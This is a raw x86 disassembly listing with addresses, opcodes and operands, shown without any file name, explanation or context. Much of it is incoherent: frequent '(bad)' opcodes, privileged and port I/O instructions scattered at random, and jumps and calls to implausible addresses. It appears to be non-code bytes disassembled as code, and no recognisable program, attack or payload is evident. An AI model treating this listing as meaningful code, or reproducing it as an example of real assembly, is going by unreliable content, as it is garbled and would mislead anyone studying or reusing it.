  4319eb:	adc    DWORD PTR [ecx],esi
  4319ed:	pop    esi
  4319ee:	inc    ecx
  4319ef:	leave  
  4319f0:	or     DWORD PTR [eax],ebx
  4319f2:	gs push ebp
  4319f4:	add    ah,ch
  4319f6:	into   
  4319f7:	in     al,dx
  4319f8:	enter  0xb756,0xf0
  4319fc:	push   cs
  4319fd:	xor    DWORD PTR [edi-0x4fff3ff],0x790f2b38
  431a07:	or     cl,BYTE PTR [ecx+0x7d85fc00]
  431a0d:	jnp    0x74439f15
  431a13:	test   DWORD PTR [ebx+0x1cfae40f],ecx
  431a19:	add    BYTE PTR [edi],cl
  431a1b:	mov    edi,DWORD PTR [ecx-0x78]
  431a1e:	ltr    WORD PTR [ecx-0x7b]
  431a22:	dec    DWORD PTR [edi]
  431a24:	clc    
  431a25:	out    0x45,eax
  431a27:	add    BYTE PTR [eax],cl
  431a29:	cmp    ebx,0xffffff8c
  431a2c:	jge    0x431a2e
  431a2e:	jb     0x431a40
  431a30:	je     0x521ab0
  431a36:	pop    edx
  431a37:	push   esi
  431a38:	mov    ecx,DWORD PTR [edi]
  431a3a:	in     al,dx
  431a3b:	rol    DWORD PTR [ebp+0x0],1
  431a3e:	or     DWORD PTR [ebx+0xfb8c08],0x4d
  431a45:	cmp    DWORD PTR [ecx],0xfffffff0
  431a48:	hlt    
  431a49:	mov    esp,DWORD PTR [eax+0xf034d2b]
  431a4f:	(bad)  
  431a51:	push   eax
  431a52:	jns    0xb842fed0
  431a58:	lock push cs
  431a5a:	ror    edx,0x3
  431a5d:	test   BYTE PTR [ecx+0x5500e800],cl
  431a63:	dec    eax
  431a64:	rcpps  xmm4,XMMWORD PTR [ecx+0x4d]
  431a68:	(bad)  
  431a69:	mov    esi,0x7f33ff5f
  431a6e:	inc    eax
  431a6f:	test   DWORD PTR [edx],eax
  431a71:	je     0x431a33
  431a73:	mov    ecx,ecx
  431a75:	adc    DWORD PTR [ebp-0xc],0xffffffec
  431a79:	and    eax,DWORD PTR [eax+0xf0103]
  431a7f:	jp     0x431a6d
  431a81:	rcpps  xmm3,XMMWORD PTR [edx-0x25]
  431a85:	add    edx,DWORD PTR [edi+0x74]
  431a88:	sbb    BYTE PTR [ebp+0x4d001484],cl
  431a8e:	add    BYTE PTR [ebp-0x74c48bbb],al
  431a94:	je     0x431a19
  431a96:	cmp    eax,edi
  431a98:	js     0x431abd
  431a9a:	add    eax,0xeb0fc003
  431a9f:	jns    0x431a2c
  431aa1:	vmread DWORD PTR [ecx+0x45],ebx
  431aa5:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  431aab:	adc    al,0x8b
  431aad:	jge    0x431ac3
  431aaf:	mov    edi,DWORD PTR [eax-0x4]
  431ab2:	add    edi,DWORD PTR [edi]
  431ab4:	or     bh,bh
  431ab6:	push   ebp
  431ab7:	push   es
  431ab8:	mov    DWORD PTR [ebp-0x4],ebx
  431abb:	add    edi,esi
  431abd:	pop    es
  431abe:	add    esi,DWORD PTR [edi-0x48ccf183]
  431ac4:	mov    DWORD PTR [esp+esi*8],ecx
  431ac7:	inc    ebp
  431ac8:	pop    ebp
  431ac9:	xor    DWORD PTR [esi-0x4],0x3b
  431acd:	add    edx,DWORD PTR [ecx+edi*1]
  431ad0:	push   es
  431ad1:	clc    
  431ad2:	mov    bh,0xdb
  431ad4:	jp     0x431a8d
  431ad6:	add    cl,BYTE PTR [esi]
  431ad8:	div    DWORD PTR [edi+0x4d8b0c1c]
  431ade:	test   edi,edi
  431ae0:	je     0x431ad6
  431ae2:	mov    eax,ecx
  431ae4:	or     BYTE PTR [ebx],al
  431ae6:	dec    BYTE PTR [ecx+0x7d3bec7d]
  431aec:	jbe    0x431b60
  431aee:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  431af4:	add    ecx,DWORD PTR [esi]
  431af6:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  431afc:	add    eax,DWORD PTR [ebx-0x287af783]
  431b02:	je     0x431b51
  431b04:	mov    DWORD PTR [ecx],edi
  431b06:	mov    esi,eax
  431b08:	hlt    
  431b09:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  431b10:	jb     0x431ad2
  431b12:	jmp    0x431aff
  431b14:	xor    esi,DWORD PTR [ebx]
  431b16:	pop    edi
  431b17:	pop    esi
  431b18:	pop    ebx
  431b19:	ret    
  431b1a:	ret    0x8b
  431b1d:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  431b23:	xor    DWORD PTR [ecx],0xc
  431b26:	pushf  
  431b27:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  431b2d:	rdmsr  
  431b2f:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  431b36:	dec    ebp
  431b37:	ret    
  431b38:	mov    edi,DWORD PTR [esi-0x4]
  431b3b:	pop    eax
  431b3c:	dec    ebp
  431b3d:	jne    0x431aca
  431b3f:	xor    edi,esp
  431b41:	inc    eax
  431b42:	dec    ebp
  431b43:	jbe    0x431b98
  431b45:	inc    eax
  431b46:	pop    ebp
  431b47:	add    edx,DWORD PTR [esi+0x8]
  431b4a:	push   esp
  431b4b:	dec    eax
  431b4c:	push   ecx
  431b4d:	mov    eax,edi
  431b4f:	and    al,0xf0
  431b51:	jo     0x431b3e
  431b53:	mov    eax,DWORD PTR [ebx]
  431b55:	sbb    BYTE PTR [ebp+0x4d],cl
  431b58:	mov    eax,DWORD PTR [ebx]
  431b5a:	nop
  431b5b:	or     BYTE PTR [eax],al
  431b5d:	jne    0x431bb6
  431b5f:	cmp    ebx,DWORD PTR [ebx+0x33893277]
  431b65:	cld    
  431b66:	xor    edi,edi
  431b68:	add    edi,DWORD PTR [ebp+0x3]
  431b6b:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  431b71:	js     0x431af7
  431b73:	jae    0x431b77
  431b75:	(bad)  
  431b77:	xor    al,0x5d
  431b79:	jmp    0x431b06
  431b7b:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  431b82:	fdecstp 
  431b84:	test   BYTE PTR [edi],ah
  431b86:	add    bh,BYTE PTR [ebp+0x0]
  431b89:	add    ebx,DWORD PTR [ebp-0x77]
  431b8c:	mov    edi,eax
  431b8e:	cmp    al,0x0
  431b91:	adc    dh,BYTE PTR [ebx]
  431b93:	jge    0x431b98
  431b95:	mov    edi,DWORD PTR [ebx]
  431b97:	jl     0x431ba8
  431b99:	clc    
  431b9a:	dec    edi
  431b9b:	jge    0x431b9d
  431b9d:	mov    eax,DWORD PTR [ebx]
  431b9f:	jb     0x431ba9
  431ba1:	mov    ecx,DWORD PTR [ebp-0x8]
  431ba4:	mov    edi,edi
  431ba6:	xor    edx,DWORD PTR [eax]
  431ba8:	add    edi,DWORD PTR [ebx]
  431baa:	mov    DWORD PTR [ebp-0x10],edi
  431bad:	inc    edi
  431bae:	pop    ebp
  431baf:	jge    0x431bec
  431bb1:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  431bb5:	mov    edx,0xc05d87f0
  431bba:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  431bbe:	fimul  WORD PTR [eax]
  431bc0:	fist   WORD PTR [ebp+0x1c]
  431bc3:	in     al,dx
  431bc4:	jne    0x431bb2
  431bc6:	mov    edi,DWORD PTR [edx-0x7a27a10]
  431bcc:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  431bd0:	fdivp  st(0),st
  431bd2:	fild   WORD PTR [ebp+0x4510f85c]
  431bd8:	test   BYTE PTR [ebx+0x4d00fc02],cl
  431bde:	inc    ebp
  431bdf:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  431be5:	mov    ebp,DWORD PTR [ebx-0x4]
  431be8:	adc    al,0x8b
  431bea:	rcl    DWORD PTR [eax],0x48
  431bed:	mov    esi,0x7080803
  431bf2:	fiadd  WORD PTR [ebp+0x4d]
  431bf5:	(bad)  
  431bf6:	mov    edx,DWORD PTR [edx-0x4]
  431bf9:	mov    edx,DWORD PTR [ebp-0x4]
  431bfc:	xor    ebx,DWORD PTR [ebx+0x330103]
  431c02:	mov    DWORD PTR [edi+0x872dc],edi
  431c08:	xlat   BYTE PTR ds:[ebx]
  431c09:	into   
  431c0a:	ffreep st(6)
  431c0c:	retf   0x6c7
  431c0f:	iret   
  431c10:	dec    ebp
  431c11:	inc    ebp
  431c12:	mov    DWORD PTR [ebx],edi
  431c14:	fmul   QWORD PTR [edi]
  431c16:	dec    ebp
  431c17:	jnp    0x431c4c
  431c19:	add    BYTE PTR [ebx],al
  431c1b:	mov    ecx,DWORD PTR [esp+edi*8]
  431c1e:	inc    ebp
  431c1f:	dec    ebp
  431c20:	lea    esi,[ebx]
  431c22:	add    DWORD PTR [ebx],eax
  431c24:	jb     0x431c61
  431c26:	add    BYTE PTR [edi],cl
  431c28:	inc    ebp
  431c29:	imul   eax,edi,0x858bd800
  431c2f:	cld    
  431c30:	clc    
  431c31:	mov    DWORD PTR [ebp+0x0],eax
  431c34:	inc    DWORD PTR [eax]
  431c36:	or     al,0xde
  431c38:	sbb    bh,0x1
  431c3b:	retf   
  431c3c:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  431c43:	dec    ebp
  431c44:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  431c4a:	enter  0x12de,0xdf
  431c4e:	inc    ebp
  431c4f:	pop    ebp
  431c50:	dec    DWORD PTR [ebx-0x257f0ff4]
  431c56:	add    DWORD PTR [edx],edx
  431c58:	add    BYTE PTR [ebp+0x50],dl
  431c5b:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  431c61:	xor    ecx,DWORD PTR [edx-0x38c699fd]
  431c67:	or     ah,al
  431c69:	pop    ss
  431c6a:	cdq    
  431c6b:	push   ebp
  431c6c:	clc    
  431c6d:	mov    eax,DWORD PTR [ebp-0x4]
  431c70:	xor    edx,edx
  431c72:	add    esi,DWORD PTR [ebx]
  431c74:	cmp    eax,DWORD PTR [ebx]
  431c76:	hlt    
  431c77:	cmp    DWORD PTR [ebx],esp
  431c79:	or     al,BYTE PTR [ebp+0xf]
  431c7c:	mov    eax,DWORD PTR [edx]
  431c7e:	loopne 0x431c80
  431c80:	(bad)  
  431c81:	mov    ecx,esi
  431c83:	cld    
  431c84:	pushf  
  431c85:	pop    ebp
  431c86:	fwait
  431c87:	mov    esi,DWORD PTR [edx]
  431c89:	lock mov eax,eax
  431c8c:	adc    BYTE PTR [ebx],al
  431c8e:	or     BYTE PTR [ebx+0x4d001001],0xcf
  431c95:	xor    ebp,DWORD PTR [edi+0x50e45189]
  431c9b:	dec    ebp
  431c9c:	mov    ecx,DWORD PTR [ebx-0x31390304]
  431ca2:	(bad)  
  431ca3:	iret   
  431ca4:	inc    ebp
  431ca5:	(bad)  
  431ca6:	jne    0x431cf5
  431ca8:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  431cae:	(bad)  
  431caf:	cmp    ebx,eax
  431cb1:	je     0x431c39
  431cb3:	add    edi,edi
  431cb5:	or     bh,bh
  431cb7:	dec    ebp
  431cb8:	inc    ebp
  431cb9:	mov    esi,DWORD PTR [ebx]
  431cbb:	cld    
  431cbc:	add    ecx,esi
  431cbe:	cmp    ecx,DWORD PTR [eax-0xc]
  431cc1:	mov    edx,DWORD PTR [edi]
  431cc3:	or     BYTE PTR [ebp-0x7c],al
  431cc6:	mov    ebx,DWORD PTR [ebx-0x7639cd18]
  431ccc:	test   BYTE PTR [ebx+ebx*4],cl
  431ccf:	inc    ebp
  431cd0:	xor    bh,BYTE PTR [esi]
  431cd2:	mov    DWORD PTR [eax+ebp*8+0x10ef8b],ebx
  431cd9:	jne    0x431ca2
  431cdb:	mov    ebp,esp
  431cdd:	fcomp  DWORD PTR [ebx]
  431cdf:	add    BYTE PTR [ecx],al
  431ce1:	inc    DWORD PTR [ebp-0x75]
  431ce4:	(bad)  
  431ce5:	cld    
  431ce6:	add    al,0xce
  431ce8:	mov    ecx,edi
  431cea:	cld    
  431ceb:	inc    ebp
  431cec:	fidivr WORD PTR [ebx]
  431cee:	fbstp  TBYTE PTR [ebp-0x3e]
  431cf1:	mov    eax,DWORD PTR [eax]
  431cf3:	adc    BYTE PTR [ebx-0x3974038b],cl
  431cf9:	fadd   st,st(7)
  431cfb:	add    BYTE PTR [ebp-0x1],al
  431cfe:	mov    ecx,DWORD PTR [esp+edi*8]
  431d01:	inc    ebp
  431d02:	mov    bh,0xc7
  431d05:	loopne 0x431d4c
  431d07:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  431d0d:	sbb    dh,BYTE PTR [ebx]
  431d0f:	pushf  
  431d10:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  431d16:	mov    eax,edi
  431d18:	cwde   
  431d19:	inc    ebp
  431d1a:	inc    ebp
  431d1b:	jne    0x431ca8
  431d1d:	mov    esp,esp
  431d1f:	clc    
  431d20:	add    al,0x4d
  431d22:	mov    DWORD PTR [ebx],esi
  431d24:	or     al,0x33
  431d26:	inc    ebp
  431d27:	lea    ecx,[ebx-0x398d13fd]
  431d2d:	add    bh,al
  431d2f:	inc    ebp
  431d30:	ror    DWORD PTR [ebx+0x45d829],0x8b
  431d37:	add    ebp,esp
  431d39:	shufps xmm1,xmm3,0xc7
  431d3d:	(bad)  
  431d3e:	jmp    0x74885867
  431d43:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  431d49:	hlt    
  431d4a:	mov    ecx,DWORD PTR [edi]
  431d4c:	fadd   DWORD PTR [ebp+0x0]
  431d4f:	xor    ecx,DWORD PTR [edi]
  431d51:	add    ecx,ecx
  431d53:	cmp    edi,edi
  431d55:	pmuludq mm7,QWORD PTR [edx+0x50]
  431d59:	(bad)  
  431d5a:	jmp    0x431ce7
  431d5c:	mov    edi,esp
  431d5e:	or     al,0xc6
  431d60:	inc    ebp
  431d61:	(bad)  
  431d62:	mov    eax,DWORD PTR [ebp+0x10]
  431d65:	jne    0x431cf0
  431d67:	mov    eax,DWORD PTR [ecx]
  431d69:	clc    
  431d6a:	add    BYTE PTR [ebp-0x40],cl
  431d6d:	xor    edx,DWORD PTR [eax-0x73]
  431d70:	jne    0x431d73
  431d72:	push   DWORD PTR [edx+0x8]
  431d75:	add    BYTE PTR [ebp+0x45],al
  431d78:	mov    ebp,ecx
  431d7a:	cld    
  431d7b:	add    BYTE PTR [ebp+0x0],cl
  431d7e:	xor    eax,DWORD PTR [ebp+0x3]
  431d81:	mov    DWORD PTR [ebx],edi
  431d83:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  431d89:	sub    eax,0x5d330e4d
  431d8e:	lea    esi,[ebx]
  431d90:	add    DWORD PTR [ebx],eax
  431d92:	jb     0x431d7d
  431d94:	add    BYTE PTR [eax],al
  431d96:	inc    ebp
  431d97:	add    bl,ch
  431d99:	inc    ebp
  431d9a:	mov    esi,DWORD PTR [ebx]
  431d9c:	or     al,0x3
  431d9e:	(bad)  
  431d9f:	mov    edi,eax
  431da1:	in     al,dx
  431da2:	scas   eax,DWORD PTR es:[edi]
  431da3:	inc    ebp
  431da4:	mov    esi,DWORD PTR [ebx]
  431da6:	in     al,0x3
  431da8:	add    al,0x89
  431daa:	mov    ecx,DWORD PTR [eax+edi*8]
  431dad:	dec    ebp
  431dae:	(bad)  
  431daf:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3165]
  431db6:	mov    ecx,eax
  431db8:	cld    
  431db9:	push   es
  431dba:	dec    ebp
  431dbb:	add    al,0x33
  431dbd:	mov    DWORD PTR [ebx],eax
  431dbf:	in     al,dx
  431dc0:	cmp    DWORD PTR [ebp-0x67],eax
  431dc3:	mov    eax,DWORD PTR [ebp-0xba0068]
  431dc9:	mov    edx,DWORD PTR [ebp-0x4]
  431dcc:	mov    ecx,DWORD PTR [ebp-0x2c]
  431dcf:	xor    eax,DWORD PTR [ebp+0x3]
  431dd2:	cmp    DWORD PTR [ebx],0x8b32749a
  431dd8:	xor    edi,esp
  431dda:	jmp    0xff771b2c
  431ddf:	add    ecx,DWORD PTR [ebp-0x3f]
  431de2:	xor    ebx,DWORD PTR [edi]
  431de4:	add    eax,ecx
  431de6:	cmp    ebx,DWORD PTR [eax]
  431de8:	mov    ecx,DWORD PTR [ebp-0x4]
  431deb:	mov    ecx,DWORD PTR [eax]
  431ded:	adc    BYTE PTR [ebp-0x80],al
  431df0:	jmp    0x431df3
  431df2:	mov    eax,DWORD PTR [eax]
  431df4:	cld    
  431df5:	mov    bh,0xc6
  431df7:	push   ecx
  431df8:	(bad)  
  431df9:	jne    0x431e59
  431dfb:	dec    ecx
  431dfd:	or     BYTE PTR [ecx+ebx*1],cl
  431e00:	push   ebp
  431e01:	inc    ebp
  431e02:	in     al,dx
  431e03:	add    ebp,esp
  431e05:	or     bh,al
  431e07:	dec    ebp
  431e08:	cld    
  431e09:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  431e0f:	xor    DWORD PTR [edx],0x2
  431e12:	pushf  
  431e13:	dec    DWORD PTR [ebx+0x45510cf4]
  431e19:	mov    DWORD PTR [ebx+0x5445fc0c],ecx
  431e1f:	mov    edx,DWORD PTR [ecx+0xc]
  431e22:	xor    eax,esi
  431e24:	mov    edx,0xc172c7
  431e29:	inc    ebp
  431e2a:	mov    esi,DWORD PTR [ebp+0x8]
  431e2d:	mov    eax,edx
  431e2f:	call   0x84c7e524
  431e34:	add    DWORD PTR [ebx-0x76bace00],ebx
  431e3a:	mov    ebp,eax
  431e3c:	or     BYTE PTR [eax],dl
  431e3e:	jo     0x431e8d
  431e40:	push   edi
  431e41:	xor    esi,DWORD PTR [ebp+0x3]
  431e44:	(bad)  
  431e45:	pmulhuw mm0,mm1
  431e48:	test   DWORD PTR [ebp-0x8],ecx
  431e4b:	mov    DWORD PTR [ebp-0x67],eax
  431e4e:	mov    eax,DWORD PTR [ebp-0x4]
  431e51:	xor    edi,DWORD PTR [ebp-0x73]
  431e54:	xor    eax,DWORD PTR [ebx]
  431e56:	xor    esi,DWORD PTR [edx+0x3]
  431e59:	add    BYTE PTR [ecx],bh
  431e5b:	inc    ebp
  431e5c:	(bad)  
  431e5d:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  431e63:	mov    DWORD PTR [eax],0x750f0004
  431e69:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  431e6f:	lock add BYTE PTR [ebp+0x0],cl
  431e73:	mov    esi,DWORD PTR [ebp-0x18]
  431e76:	mov    ebp,edx
  431e78:	or     al,0x72
  431e7a:	ja     0x431e7c
  431e7c:	mov    edx,esi
  431e7e:	cld    
  431e7f:	(bad)  
  431e82:	cli    
  431e83:	mov    esi,DWORD PTR [ebp-0x4]
  431e86:	cmp    ecx,esi
  431e88:	bswap  edi
  431e8a:	(bad)
  431e8e:	mov    esi,DWORD PTR [ebp-0x4]
  431e91:	mov    esi,ecx
  431e93:	clc    
  431e94:	repnz add esi,DWORD PTR [ebp+0x45]
  431e98:	push   ebx
  431e99:	xor    eax,DWORD PTR [ebp+0x3]
  431e9c:	cmp    al,0x5f
  431e9e:	pushf  
  431e9f:	pop    ebx
  431ea0:	jmp    0x431f67
  431ea5:	mov    esi,DWORD PTR [ebp-0x7d]
  431ea8:	xor    ebp,DWORD PTR [eax]
  431eaa:	lea    eax,[ebp-0x8]
  431ead:	xor    edx,esi
  431eaf:	pushf  
  431eb0:	out    dx,eax
  431eb1:	(bad)  
  431eb2:	neg    eax
  431eb4:	ins    DWORD PTR es:[edi],dx
  431eb5:	test   esi,edi
  431eb7:	clc    
  431eb8:	pop    esp
  431eb9:	inc    ebp
  431eba:	or     BYTE PTR [ecx+0x450f0c7d],cl
  431ec0:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  431ec6:	add    cl,al
  431ec8:	jne    0x431e65
  431eca:	mov    esi,DWORD PTR [edx]
  431ecc:	in     al,dx
  431ecd:	push   esi
  431ece:	xor    BYTE PTR [ebp-0xe],dh
  431ed1:	add    edi,esi
  431ed3:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  431ed9:	add    cl,bh
  431edb:	mov    edi,DWORD PTR [ebp+0x8]
  431ede:	mov    DWORD PTR [ebp-0x14],esi
  431ee1:	add    esi,DWORD PTR [ebp+0x3c]
  431ee4:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  431eea:	mov    ah,0x3e
  431eec:	fwait
  431eed:	pushf  
  431eee:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  431ef4:	jne    0x431e81
  431ef6:	mov    ecx,DWORD PTR [esp+ebp*8]
  431ef9:	icebp  
  431efa:	icebp  
  431efb:	shl    edx,0xf2
  431efe:	(bad)  
  431eff:	mov    ah,0x16
  431f01:	push   eax
  431f02:	jne    0x431e97
  431f04:	mov    ecx,DWORD PTR [edi]
  431f06:	in     al,dx
  431f07:	jmp    0x431efa
  431f09:	add    dl,dh
  431f0b:	mov    edi,esi
  431f0d:	or     al,0x8
  431f0f:	inc    ebp
  431f10:	jne    0x431f15
  431f12:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  431f18:	ret    
  431f19:	or     bh,bh
  431f1b:	jge    0x431f05
  431f1d:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  431f23:	xor    edi,eax
  431f25:	add    esi,DWORD PTR [ebp-0x77]
  431f28:	mov    ebx,esp
  431f2a:	clc    
  431f2b:	neg    DWORD PTR [ebp-0x7c]
  431f2e:	xor    eax,DWORD PTR [eax]
  431f30:	cmp    eax,DWORD PTR [eax]
  431f32:	repz jne 0x431eca
  431f35:	xor    eax,DWORD PTR [ecx]
  431f37:	add    ebx,DWORD PTR [eax]
  431f39:	mov    DWORD PTR [ebp-0x8],eax
  431f3c:	mov    eax,edi
  431f3e:	cld    
  431f3f:	lock pop eax
  431f41:	test   DWORD PTR [ebx],esi
  431f43:	clc    
  431f44:	add    edx,DWORD PTR [edi-0x740bff77]
  431f4a:	fdivp  st(4),st
  431f4c:	test   ecx,esi
  431f4e:	(bad)  
  431f4f:	jnp    0x431f50
  431f51:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  431f57:	jae    0x431ee4
  431f59:	sub    edi,esp
  431f5b:	(bad)  
  431f5c:	shl    DWORD PTR [eax-0x3e],0x89
  431f60:	leave  
  431f61:	call   0x8198d66e
  431f66:	in     al,dx
  431f67:	(bad)  
  431f68:	in     al,dx
  431f69:	add    bh,al
  431f6b:	mov    esp,edi
  431f6d:	in     al,dx
  431f6e:	test   DWORD PTR [ebp-0x8],edi
  431f71:	mov    eax,DWORD PTR [ebp+0x2b]
  431f74:	xor    al,BYTE PTR [ebx]
  431f76:	pushf  
  431f77:	jnp    0x57321bb0
  431f7d:	xor    edx,DWORD PTR [ecx+ecx*4+0x51]
  431f81:	loopne 0x431fb6
  431f83:	jne    0x431f40
  431f85:	mov    esi,DWORD PTR [edx-0x20]
  431f88:	add    BYTE PTR [ebp-0x3d],bh
  431f8b:	xor    eax,DWORD PTR [ebp-0x73]
  431f8e:	mov    edi,DWORD PTR [esi]
  431f90:	cld    
  431f91:	jb     0x431f59
  431f93:	add    bl,al
  431f95:	jne    0x431fdc
  431f97:	mov    edx,DWORD PTR [edi-0x10]
  431f9a:	jge    0x432019
  431f9c:	mov    esi,DWORD PTR [ebx]
  431f9e:	lock add ecx,DWORD PTR [ebp+0x3b]
  431fa2:	xor    esi,DWORD PTR [ebp-0x77]
  431fa5:	mov    esi,eax
  431fa7:	lock inc ebp
  431fa9:	jge    0x431fdc
  431fab:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  431fb2:	dec    ebp
  431fb3:	mov    esi,DWORD PTR [ebx]
  431fb5:	loopne 0x431f40
  431fb7:	jge    0x431fb1
  431fb9:	add    DWORD PTR [ebp-0x7d],eax
  431fbc:	icebp  
  431fbd:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  431fc4:	dec    ebp
  431fc5:	hlt    
  431fc6:	xor    ebx,DWORD PTR [ebp-0x77]
  431fc9:	mov    esi,esp
  431fcb:	in     al,0x45
  431fcd:	jge    0x43200c
  431fcf:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  431fd6:	dec    ebp
  431fd7:	push   esp
  431fd8:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  431fde:	inc    ebp
  431fdf:	hlt    
  431fe0:	xor    DWORD PTR [ebp-0x61],esi
  431fe3:	mov    edi,DWORD PTR [eax+0xf19504]
  431fe9:	repnz mov DWORD PTR [ebp+0x20],ebx
  431fed:	cmp    eax,DWORD PTR [ebp+0xf]
  431ff0:	test   DWORD PTR [edi+ecx*1-0x1],edx
  431ff4:	fistp  WORD PTR [ebx+0x0]
  431ff7:	inc    ebp
  431ff8:	mov    ebx,DWORD PTR [edi+0xc]
  431ffb:	add    eax,eax
  431ffd:	inc    ebp
  431ffe:	test   BYTE PTR [ebx],dh
  432000:	add    eax,DWORD PTR [ebx]
  432002:	add    BYTE PTR [esi+0x45],bl
  432005:	ret    0x85
  432008:	jnp    0x5443a3d7
  43200e:	inc    bp
  432010:	inc    ebp
  432011:	xor    DWORD PTR [ecx+0xc78a9c],edi
  432017:	fdiv   QWORD PTR [ebx]
  432019:	test   DWORD PTR [ecx+0x453bf8],edi
  43201f:	push   ebx
  432020:	add    edi,DWORD PTR [esi+0x708088b]
  432026:	cmp    esi,eax
  432028:	setnp  BYTE PTR [ecx-0x74fcffce]
  43202f:	mov    esp,edi
  432031:	call   0x33ce6583
  432036:	or     BYTE PTR [ebx],al
  432038:	inc    ecx
  432039:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  43203f:	and    BYTE PTR [ebp-0x7074f0bb],al
  432045:	lock add cl,al
  432048:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  43204f:	mov    ch,0x45
  432051:	clc    
  432052:	xor    eax,DWORD PTR [ebp+0x3]
  432055:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  43205b:	inc    ebp
  43205c:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  432062:	mov    edi,eax
  432064:	mov    eax,DWORD PTR [ebp+0x3c]
  432067:	mov    ecx,DWORD PTR [eax]
  432069:	hlt    
  43206a:	inc    ebp
  43206b:	ror    DWORD PTR [ebx+0x818c45],0xf4
  432072:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  432078:	push   ebp
  432079:	mov    edi,DWORD PTR [ebx]
  43207b:	in     al,dx
  43207c:	jne    0x43203f
  43207e:	mov    eax,DWORD PTR [ebp-0x28]
  432081:	add    DWORD PTR [eax],0xe8058dec
  432087:	clc    
  432088:	mov    esi,DWORD PTR [edi-0x8]
  43208b:	add    dh,dl
  43208d:	rol    WORD PTR [ebp-0x1],cl
  432091:	mov    edx,DWORD PTR [eax+0x8]
  432094:	jne    0x432056
  432096:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  43209d:	inc    ebp
  43209e:	push   esp
  43209f:	test   DWORD PTR [ecx+0xf],ecx
  4320a2:	sub    edx,esp
  4320a4:	add    eax,DWORD PTR [eax]
  4320a6:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4320ac:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4320b3:	mov    eax,DWORD PTR [ecx]
  4320b5:	and    BYTE PTR [eax],al
  4320b7:	cmp    al,0x10
  4320b9:	add    BYTE PTR [ebp+0x66],al
  4320bc:	inc    ecx
  4320be:	push   esp
  4320bf:	add    dh,BYTE PTR [ebp+0x0]
  4320c2:	push   edx
  4320c3:	enterw 0xc1,0x4d
  4320c8:	mov    esp,DWORD PTR [esi+0x20]
  4320cb:	add    DWORD PTR [ecx-0x7b],eax
  4320ce:	add    eax,DWORD PTR [ebx]
  4320d0:	str    WORD PTR [eax+0x45]
  4320d4:	lea    ecx,[ebx+0x45890801]
  4320da:	sbb    BYTE PTR [ebx],al
  4320dc:	dec    ebp
  4320dd:	cmp    al,0xf
  4320df:	inc    ebp
  4320e0:	push   eax
  4320e1:	mov    esi,DWORD PTR [ebx]
  4320e3:	push   eax
  4320e4:	add    eax,eax
  4320e6:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  4320ed:	inc    ebp
  4320ee:	add    BYTE PTR [ecx],dh
  4320f0:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  4320f7:	(bad)  
  4320f8:	mov    ebx,eax
  4320fa:	loopne 0x432141
  4320fc:	dec    ebp
  4320fd:	mov    ecx,DWORD PTR [edi]
  4320ff:	cld    
  432100:	push   eax
  432101:	xchg   DWORD PTR [ebx],esi
  432103:	add    DWORD PTR [ebx],ebp
  432105:	add    BYTE PTR [ebx],ch
  432107:	or     BYTE PTR [ecx],bh
  432109:	dec    ecx
  43210a:	loopne 0x43210f
  43210c:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  432112:	push   ebp
  432113:	add    DWORD PTR [ebx+0x55100800],eax
  432119:	dec    ebp
  43211a:	jmp    0x4320a5
  43211c:	mov    esp,DWORD PTR [eax]
  43211e:	sbb    dl,dl
  432120:	inc    eax
  432121:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  432127:	add    BYTE PTR [ebx+0x74528555],cl
  43212d:	push   ebp
  43212e:	div    DWORD PTR [ebx]
  432130:	and    eax,DWORD PTR [ebx]
  432132:	add    edx,DWORD PTR [edx-0x30]
  432135:	jno    0x4320c2
  432137:	inc    DWORD PTR [eax+eiz*1]
  43213a:	inc    ebp
  43213b:	push   eax
  43213c:	push   eax
  43213d:	mov    esp,DWORD PTR [edi-0x74beff1c]
  432143:	mov    edi,esp
  432145:	push   eax
  432146:	inc    ebp
  432147:	enter  0x458b,0x8
  43214b:	push   ecx
  43214c:	(bad)  
  43214d:	call   0x10d2b25
  432152:	pop    ss
  432153:	push   ebp
